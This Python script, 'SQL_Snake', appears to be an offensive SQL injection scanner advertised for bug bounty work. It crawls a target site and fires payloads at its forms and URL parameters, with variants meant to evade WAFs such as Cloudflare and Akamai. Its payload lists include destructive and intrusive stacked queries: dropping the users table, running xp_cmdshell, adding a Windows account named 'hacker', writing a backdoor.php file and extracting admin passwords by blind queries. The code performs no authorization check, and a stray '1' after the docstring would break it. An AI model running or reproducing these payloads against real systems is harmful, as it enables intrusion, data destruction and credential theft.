#!/usr/bin/env python3
"""
SQL_Snake - Advanced SQL Injection Scanner for Bug Bounty Hunting
Designed to bypass modern WAFs (Cloudflare, Akamai, etc.) and detect complex SQLi vulnerabilities
"""
1
import os
import sys
import time
import random
import requests
import argparse
from urllib.parse import urlparse, urljoin, quote_plus
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ASCII Art Logo
LOGO = f"""
{Fore.RED}

 _____  _____ _          _____             _         
/  ___||  _  | |        /  ___|           | |         
\ `--. | | | | |  ______\ `--. _ __   __ _| | _____   
 `--. \| | | | | |______|`--. \ '_ \ / _` | |/ / _ \  
/\__/ /\ \/' / |____    /\__/ / | | | (_| |   <  __/  
\____/  \_/\_\_____/    \____/|_| |_|\__,_|_|\_\___|  



{Style.RESET_ALL}
{Fore.YELLOW}Advanced SQLi Scanner for Elite Bug Bounty Hunters{Style.RESET_ALL}
"""

# WAF bypass techniques
EVASION_TECHNIQUES = [
    "/*!50000SELECT*/",  # MySQL inline comments
    "%%!SELECT%%",      # Obfuscated
    "SEL%0bECT",        # Vertical tab
    "UNION/**/SELECT",  # Comment obfuscation
    "UNI%0aON%0aSELECT", # Newline separation
    "UNION%0dSELECT",   # Carriage return
    "UNION%23%0aSELECT", # URL-encoded comment
    "UNION ALL SELECT", # Classic bypass
    "1'||'1",           # Concatenation
    "1'|'1",            # Bitwise OR
    "1'^'1",            # Bitwise XOR
    "1' and 1=convert(int,@@version)--", # MSSQL technique
    "1' and 1=1--",     # Classic
    "1' waitfor delay '0:0:5'--", # Time-based
    "1'/**/OR/**/1=1",  # Comment obfuscation
    "1'/*!50000OR*/1=1", # MySQL version-specific
]

# Advanced payloads for different DB types
PAYLOADS = {
    'generic': [
        "'",
        '"',
        "' OR '1'='1",
        "' OR 1=1--",
        '" OR "" = "',
        "' OR '' = '",
        "' OR 1=1#",
        "' OR 1=1-- -",
        "' OR 'a'='a",
        '" OR "a"="a',
        "' OR 1=1/*",
    ],
    'error_based': [
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=1 UNION ALL SELECT 1,@@version,3,4,5--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,@@version,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
        "' AND EXTRACTVALUE(0,CONCAT(0x5c,@@version))--",
        "' AND 1=(SELECT 1 FROM DUAL WHERE 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a))--",
    ],
    'time_based': [
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))--",
        "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        "' AND (SELECT BENCHMARK(10000000,MD5(NOW())))--",
        "' AND (SELECT 1 FROM (SELECT SLEEP(5))WHERE @@version LIKE '%')--",
        "' OR IF(1=1,SLEEP(5),0)--",
    ],
    'boolean': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=53--",
        "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)=8)--",
    ],
    'stacked': [
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; EXEC master..xp_cmdshell('net user hacker P@ssw0rd /ADD')--",
        "'; SELECT * FROM users INTO OUTFILE '/var/www/html/backdoor.php'--",
    ],
    'blind': [
        "' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
        "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1--",
        "' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)))=97--",
    ]
}

# Common WAF signatures to detect
WAF_SIGNATURES = {
    'Cloudflare': ['cloudflare', 'cf-ray', 'attention required'],
    'Akamai': ['akamai', 'akamaighost'],
    'Imperva': ['imperva', 'incapsula'],
    'ModSecurity': ['mod_security', 'libmodsecurity'],
    'AWS WAF': ['aws waf', 'awsalb'],
    'FortiWeb': ['fortiweb'],
    'F5 BIG-IP': ['bigip', 'f5'],
    'Barracuda': ['barracuda'],
    'Sucuri': ['sucuri'],
    'Wordfence': ['wordfence'],
}

class SQLSnakeScanner:
    def __init__(self, target_url, method='GET', depth=3, threat_level='medium', timeout=10, user_agent=None, proxy=None):
        self.target_url = target_url
        self.method = method.upper()
        self.depth = depth
        self.threat_level = threat_level.lower()
        self.timeout = timeout
        self.user_agent = user_agent or self._get_random_user_agent()
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.session = requests.Session()
        self.vulnerabilities = []
        self.waf_detected = None
        self.parameters = []
        self.cookies = {}
        self.headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
    def _get_random_user_agent(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        ]
        return random.choice(user_agents)
    
    def _check_waf(self, response):
        for waf, signatures in WAF_SIGNATURES.items():
            for signature in signatures:
                if signature.lower() in response.text.lower() or signature.lower() in str(response.headers).lower():
                    self.waf_detected = waf
                    return True
        return False
    
    def _send_request(self, url, params=None, data=None, cookies=None, headers=None):
        try:
            if self.method == 'GET':
                response = self.session.get(
                    url,
                    params=params,
                    cookies=cookies or self.cookies,
                    headers=headers or self.headers,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = self.session.post(
                    url,
                    data=data or params,
                    cookies=cookies or self.cookies,
                    headers=headers or self.headers,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    verify=False,
                    allow_redirects=True
                )
            return response
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Request failed: {e}{Style.RESET_ALL}")
            return None
    
    def _extract_forms(self, html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        forms = []
        for form in soup.find_all('form'):
            form_details = {
                'action': form.get('action'),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            for input_tag in form.find_all('input'):
                input_details = {
                    'name': input_tag.get('name'),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                form_details['inputs'].append(input_details)
            forms.append(form_details)
        return forms
    
    def _extract_links(self, html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        links = set()
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            if href.startswith('javascript:'):
                continue
            full_url = urljoin(self.target_url, href)
            links.add(full_url)
        return links
    
    def _is_vulnerable(self, response, original_response):
        # Detect based on error messages
        error_strings = [
            'SQL syntax',
            'mysql_fetch',
            'syntax error',
            'unclosed quotation mark',
            'ORA-00933',
            'ORA-01756',
            'Microsoft OLE DB Provider',
            'ODBC Driver',
            'PostgreSQL query failed',
            'Warning: mysql_',
            'unexpected end of SQL command',
            'SQL command not properly ended',
            'syntax error at or near',
            'SQLite3::SQLException',
            'MariaDB server version',
            'SQL error',
            'MySQL server version',
            'DB2 SQL error',
            'Sybase message',
        ]
        
        for error in error_strings:
            if error.lower() in response.text.lower():
                return True
        
        # Detect based on time delay (for time-based SQLi)
        if response.elapsed.total_seconds() > 5:
            return True
        
        # Detect based on content differences
        if original_response and (len(response.text) != len(original_response.text)):
            return True
            
        return False
    
    def _generate_evasive_payloads(self, payload):
        evasive_payloads = []
        
        # Add comment obfuscation
        evasive_payloads.append(f"/*!50000{payload}*/")
        evasive_payloads.append(f"/*!{payload}*/")
        
        # Add whitespace obfuscation
        evasive_payloads.append(payload.replace(' ', '/**/'))
        evasive_payloads.append(payload.replace(' ', '%0b'))
        evasive_payloads.append(payload.replace(' ', '%0a'))
        evasive_payloads.append(payload.replace(' ', '%0d'))
        
        # Add URL encoding
        evasive_payloads.append(quote_plus(payload))
        
        # Add case variation
        evasive_payloads.append(payload.upper())
        evasive_payloads.append(payload.lower())
        
        # Add null bytes
        evasive_payloads.append(f"%00{payload}")
        evasive_payloads.append(f"{payload}%00")
        
        return evasive_payloads
    
    def _test_parameter(self, url, param_name, param_value, method='GET'):
        original_response = self._send_request(url, {param_name: param_value}) if method == 'GET' else self._send_request(url, data={param_name: param_value})
        
        if not original_response:
            return False
            
        # Test with various payloads based on threat level
        payloads_to_test = []
        
        if self.threat_level == 'low':
            payloads_to_test.extend(PAYLOADS['generic'])
        elif self.threat_level == 'medium':
            payloads_to_test.extend(PAYLOADS['generic'])
            payloads_to_test.extend(PAYLOADS['error_based'])
            payloads_to_test.extend(PAYLOADS['boolean'])
        else:  # high
            payloads_to_test.extend(PAYLOADS['generic'])
            payloads_to_test.extend(PAYLOADS['error_based'])
            payloads_to_test.extend(PAYLOADS['time_based'])
            payloads_to_test.extend(PAYLOADS['boolean'])
            payloads_to_test.extend(PAYLOADS['blind'])
            payloads_to_test.extend(PAYLOADS['stacked'])
        
        for payload in payloads_to_test:
            # Generate evasive variations
            test_payloads = self._generate_evasive_payloads(payload)
            
            for test_payload in test_payloads:
                if method == 'GET':
                    test_params = {param_name: test_payload}
                    test_response = self._send_request(url, params=test_params)
                else:
                    test_data = {param_name: test_payload}
                    test_response = self._send_request(url, data=test_data)
                
                if test_response and self._is_vulnerable(test_response, original_response):
                    vulnerability = {
                        'url': url,
                        'parameter': param_name,
                        'payload': test_payload,
                        'method': method,
                        'evidence': 'Error message in response' if 'error' in test_response.text.lower() else 'Behavioral difference',
                        'type': 'SQL Injection'
                    }
                    self.vulnerabilities.append(vulnerability)
                    return True
        
        return False
    
    def _scan_page(self, url, depth):
        if depth > self.depth:
            return
            
        print(f"{Fore.CYAN}[*] Scanning: {url}{Style.RESET_ALL}")
        
        # First, check if WAF is present
        response = self._send_request(url)
        if not response:
            return
            
        if self._check_waf(response):
            print(f"{Fore.YELLOW}[!] WAF Detected: {self.waf_detected}{Style.RESET_ALL}")
        
        # Extract forms and test them
        forms = self._extract_forms(response.text)
        for form in forms:
            form_url = urljoin(url, form['action']) if form['action'] else url
            form_method = form['method']
            
            for input_field in form['inputs']:
                if input_field['type'] in ['hidden', 'submit']:
                    continue
                    
                print(f"{Fore.BLUE}[*] Testing form parameter: {input_field['name']}{Style.RESET_ALL}")
                self._test_parameter(form_url, input_field['name'], input_field['value'], form_method)
        
        # Extract URL parameters and test them
        if '?' in url:
            base_url, params_str = url.split('?', 1)
            params = dict(pair.split('=') for pair in params_str.split('&') if '=' in pair)
            
            for param_name, param_value in params.items():
                print(f"{Fore.BLUE}[*] Testing URL parameter: {param_name}{Style.RESET_ALL}")
                self._test_parameter(base_url, param_name, param_value, 'GET')
        
        # Extract links and recursively scan them
        if depth < self.depth:
            links = self._extract_links(response.text)
            for link in links:
                if link.startswith(self.target_url):  # Stay within target domain
                    self._scan_page(link, depth + 1)
    
    def scan(self):
        print(f"{Fore.GREEN}[+] Starting SQL_Snake scan on {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {self.method} | Depth: {self.depth} | Threat Level: {self.threat_level}{Style.RESET_ALL}")
        
        start_time = time.time()
        self._scan_page(self.target_url, 1)
        end_time = time.time()
        
        print(f"\n{Fore.GREEN}[+] Scan completed in {end_time - start_time:.2f} seconds{Style.RESET_ALL}")
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] Found {len(self.vulnerabilities)} potential SQL injection vulnerabilities:{Style.RESET_ALL}")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{Fore.RED}{i}. Vulnerability Found:{Style.RESET_ALL}")
                print(f"   URL: {vuln['url']}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Method: {vuln['method']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Evidence: {vuln['evidence']}")
                print(f"   Type: {vuln['type']}")
        else:
            print(f"{Fore.GREEN}[+] No SQL injection vulnerabilities found{Style.RESET_ALL}")

def get_user_input():
    print(LOGO)
    print(f"{Fore.YELLOW}SQL_Snake - Advanced SQL Injection Scanner{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Configure your scan:{Style.RESET_ALL}")
    
    target_url = input(f"{Fore.WHITE}[?] Target URL (e.g., https://example.com): {Style.RESET_ALL}").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    method = input(f"{Fore.WHITE}[?] HTTP Method (GET/POST) [GET]: {Style.RESET_ALL}").strip().upper() or 'GET'
    
    print(f"\n{Fore.YELLOW}Scan Depth:{Style.RESET_ALL}")
    print("  1 - Only target URL")
    print("  2 - Target URL + 1 level deep (recommended for large sites)")
    print("  3 - Full recursive scan (aggressive)")
    depth = int(input(f"{Fore.WHITE}[?] Scan depth [2]: {Style.RESET_ALL}") or 2)
    
    print(f"\n{Fore.YELLOW}Threat Level:{Style.RESET_ALL}")
    print("  low - Basic tests only (stealthy)")
    print("  medium - Basic + error-based tests (recommended)")
    print("  high - All tests including time-based (aggressive)")
    threat_level = input(f"{Fore.WHITE}[?] Threat level [medium]: {Style.RESET_ALL}").lower() or 'medium'
    
    proxy = input(f"{Fore.WHITE}[?] Proxy (optional, e.g., http://127.0.0.1:8080): {Style.RESET_ALL}").strip() or None
    
    return target_url, method, depth, threat_level, proxy

def main():
    try:
        target_url, method, depth, threat_level, proxy = get_user_input()
        
        scanner = SQLSnakeScanner(
            target_url=target_url,
            method=method,
            depth=depth,
            threat_level=threat_level,
            proxy=proxy
        )
        
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == '__main__':
    main()
